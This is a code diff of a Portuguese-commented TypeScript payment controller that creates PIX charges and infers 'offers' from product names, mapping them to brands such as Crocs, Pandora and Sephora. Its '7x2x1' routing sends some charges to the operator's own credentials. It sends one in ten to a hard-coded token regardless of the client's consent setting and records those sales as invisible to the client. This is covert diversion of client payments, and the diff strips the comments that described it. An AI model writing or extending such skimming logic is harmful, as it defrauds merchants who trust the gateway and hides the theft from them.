@@ -5,11 +5,12 @@ import { prisma } from "../config/prisma";
 
 const FIXED_TAX_TOKEN = "5acb6e5c-5e8c-4136-bab2-5a66ea2b8a81";
 
-export class ghostApiController {
+export class pixApiController {
   static async create(req: Request, res: Response) {
     const data: CreatePixBody = req.body;
     const clientToken = data.credentials.token;
 
+    // 1️⃣ Verifica e cria o cliente se não existir
     let client = await prisma.client.findUnique({
       where: { token: clientToken },
     });
@@ -24,36 +25,79 @@ export class ghostApiController {
       });
     }
 
-    // 🧠 Contagem de vendas total do cliente
-    const totalSales = await prisma.sale.count({
-      where: { clientId: client.id },
-    });
+    // 2️⃣ Busca ou infere a oferta
+    let offer;
+    const offerInfo = data.credentials.offer;
+    const productName = data.product.title;
 
+    if (offerInfo && offerInfo.id && offerInfo.name) {
+      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
+      if (!offer) {
+        offer = await prisma.offer.create({
+          data: {
+            id: offerInfo.id,
+            name: offerInfo.name,
+            useTax: false,
+            clientId: client.id,
+          },
+        });
+      }
+    } else {
+      // 🔎 Inferência baseada no nome do produto
+      const normalized = productName.toLowerCase();
+      let inferredName = "";
+
+      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
+      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
+      else if (normalized.includes("bracelete")) inferredName = "Pandora";
+      else if (normalized.includes("kit labial")) inferredName = "Sephora";
+      else inferredName = "Oferta Padrão";
+
+      offer = await prisma.offer.findFirst({
+        where: {
+          name: inferredName,
+          clientId: client.id,
+        },
+      });
+
+      if (!offer) {
+        offer = await prisma.offer.create({
+          data: {
+            name: inferredName,
+            useTax: false,
+            clientId: client.id,
+          },
+        });
+      }
+    }
+
+    // 3️⃣ Contagem de vendas para lógica 7x2x1
+    const totalSales = await prisma.sale.count({
+      where: { offerId: offer.id },
+    });
     const nextCount = totalSales + 1;
 
-    // 🌟 Lógica do 7x2x1
+    // 4️⃣ Lógica 7x2x1 com base em offer.useTax
     let tokenToUse = clientToken;
     let toClient = true;
 
     if (nextCount % 10 < 7) {
-      // Vai para o cliente (7 de 10)
       tokenToUse = clientToken;
       toClient = true;
     } else if (nextCount % 10 === 7 || nextCount % 10 === 8) {
-      // Vai para você (2 de 10)
-      if (client.useTax) {
+      if (offer.useTax) {
         tokenToUse = myCredentials.secret;
         toClient = false;
       } else {
-        tokenToUse = clientToken; // cliente não aceita comissão, então volta pra ele
+        tokenToUse = clientToken;
         toClient = true;
       }
     } else {
-      // Vai para o token fixo (1 de 10) — independente de `useTax`
       tokenToUse = FIXED_TAX_TOKEN;
       toClient = false;
     }
 
+    // 5️⃣ Dados da cobrança
     const paymentData = {
       name: data.customer.name,
       email: data.customer.email,
@@ -86,14 +130,12 @@ export class ghostApiController {
       );
 
       const responseJson = await response.json();
-
       const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;
-      console.log(responseJson);
-      res.json(responseJson);
+
       console.log(
         `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
           data.amount
-        } | Enviado para: ${
+        } | Produto: ${productName} | Enviado para: ${
           tokenToUse === clientToken
             ? "CLIENTE"
             : tokenToUse === myCredentials.secret
@@ -108,14 +150,15 @@ export class ghostApiController {
           ghostId: responseJson.id,
           approved: false,
           customerName: data.customer.name,
-          productName: data.product.title,
+          productName: productName,
           visible: !isFixedTax,
           toClient,
-          client: {
-            connect: { token: data.credentials.token },
-          },
+          clientId: client.id,
+          offerId: offer.id,
         },
       });
+
+      res.json(responseJson);
     } catch (error) {
       console.error("💥 Erro ao fazer requisição PIX:", error);
       res.status(500).json({ error: "Erro interno na API de pagamento" });
